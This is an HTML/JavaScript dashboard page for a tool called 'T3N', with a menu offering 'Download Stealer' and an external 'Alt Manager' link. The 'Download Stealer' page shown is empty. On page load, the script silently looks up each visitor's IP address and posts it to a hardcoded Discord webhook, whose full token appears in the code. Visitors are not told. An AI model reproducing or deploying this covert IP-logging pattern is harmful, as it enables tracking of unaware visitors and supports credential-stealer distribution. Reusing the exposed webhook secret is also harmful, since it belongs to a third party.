<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dashboard | T3N</title>

  <style>
    :root {
      --background-color: #0a0a0a;
      --text-color: #7a2fc2;
      --navbar-color: rgba(10, 10, 10, 0.95);
      --box-background-color: rgba(10, 10, 10, 0.95);
    }

    body {
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: var(--background-color);
      color: var(--text-color);
    }

    .navbar {
      width: 100%;
      background-color: var(--navbar-color);
      padding: 15px 0;
      display: flex;
      align-items: center;
      box-shadow: 0 4px 8px rgba(122, 47, 194, 0.3);
      position: fixed;
      top: 0;
      z-index: 1000;
    }

    .navbar img {
      margin-left: 20px;
      width: 75px;
      height: auto;
      transition: transform 0.6s ease;
    }

    .navbar img:hover {
      animation: spinGrowShrink 0.6s ease;
    }

    @keyframes spinGrowShrink {
      0% { transform: rotate(0deg) scale(1); }
      50% { transform: rotate(180deg) scale(1.3); }
      100% { transform: rotate(360deg) scale(1); }
    }

    .navbar button {
      background: linear-gradient(135deg, #7a2fc2, #5c1f96);
      color: white;
      border: none;
      border-radius: 6px;
      padding: 10px 20px;
      margin: 0 10px;
      font-size: 14px;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .navbar button:hover {
      transform: scale(1.05);
    }

    .dashboard-box {
      background-color: var(--box-background-color);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 10px 20px rgba(122, 47, 194, 0.3);
      text-align: center;
      width: 1200px;
      margin-top: 150px;
      opacity: 0;
      transform: translateY(20px);
      transition: all 0.5s ease;
    }

    .dashboard-box.show {
      opacity: 1;
      transform: translateY(0);
    }

    @media (max-width: 768px) {
      .navbar { flex-direction: column; }
      .dashboard-box { width: 90%; margin-top: 250px; }
    }
  </style>
</head>
<body>

  <div class="navbar">
    <a href="#"><img src="logo.png" alt="Logo" /></a>
    <button onclick="navigateTo('home')">Main Menu</button>
    <button onclick="window.location.href='https://bapehik721.github.io/-/best-site.html'">Alt Manager</button>
    <button onclick="navigateTo('settings')">Settings</button>
    <button onclick="navigateTo('download')">Download Stealer</button>
    <button onclick="navigateTo('authors')">Authors</button>
  </div>

  <div class="dashboard-box show" id="dashboard-content">
    <h1>Loading...</h1>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1363500266363683007/dDMySRUCPEbmBvXgir9DYsqII64bjmZZQF95MGx_7gq2pQfCmNxdzT8kCIUHjYycsvQ0"; 
    let currentLanguage = localStorage.getItem('language') || 'en';

    function getCurrentDate() { return new Date().toLocaleDateString(); }

    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch { return 'Unknown'; }
    }

    async function sendToDiscord(ip, date) {
        const payload = { content: `New User: ${date} | IP: ${ip}` };
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }

    function changeLanguage(language) {
        currentLanguage = language;
        localStorage.setItem('language', language);
        updateContent();
    }

    function updateContent() {
        if (currentLanguage === 'ru') {
            window.showHomePage = async () => {
                const ip = await getUserIP();
                document.getElementById("dashboard-content").innerHTML = `<h1>Главная T3N</h1><p>Дата: ${getCurrentDate()}</p><p>Твой IP: ${ip}</p>`;
            };
        } else {
            window.showHomePage = async () => {
                const ip = await getUserIP();
                document.getElementById("dashboard-content").innerHTML = `<h1>T3N Home</h1><p>Date: ${getCurrentDate()}</p><p>IP: ${ip}</p>`;
            };
        } // <--- ВОТ ЭТУ СКОБКУ ТЫ ПОТЕРЯЛ

        window.showSettingsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Settings</h1><select onchange="changeLanguage(this.value)"><option value="en" ${currentLanguage==='en'?'selected':''}>EN</option><option value="ru" ${currentLanguage==='ru'?'selected':''}>RU</option></select>`; };
        window.showDownloadPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Download</h1><p>Nothing here yet.</p>`; };
        window.showAuthorsPage = () => { document.getElementById("dashboard-content").innerHTML = `<h1>Authors</h1><p>cif3rbl4t & varenik721</p>`; };

        navigateTo('home');
    }

    function navigateTo(page) {
      const content = document.getElementById("dashboard-content");
      content.classList.remove("show");

      setTimeout(() => {
        if (page === "home") showHomePage();
        else if (page === "settings") showSettingsPage();
        else if (page === "download") showDownloadPage();
        else if (page === "authors") showAuthorsPage();
        
        setTimeout(() => content.classList.add("show"), 50);
      }, 300);
    }

    document.addEventListener("DOMContentLoaded", () => {
        updateContent();
        getUserIP().then(ip => sendToDiscord(ip, getCurrentDate()));
    });
  </script>
</body>
</html>
